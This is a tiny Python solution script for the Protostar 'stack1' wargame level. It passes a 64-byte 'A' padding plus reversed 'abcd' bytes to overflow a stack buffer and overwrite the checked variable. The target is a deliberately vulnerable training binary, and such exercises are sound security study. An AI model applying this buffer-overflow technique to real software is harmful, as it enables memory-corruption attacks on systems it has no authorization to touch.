import subprocess
import struct

program = "/opt/protostar/bin/stack1"

string = "A"*64 + "abcd"[::-1]
process = subprocess.Popen([program,string], stdin=subprocess.PIPE)




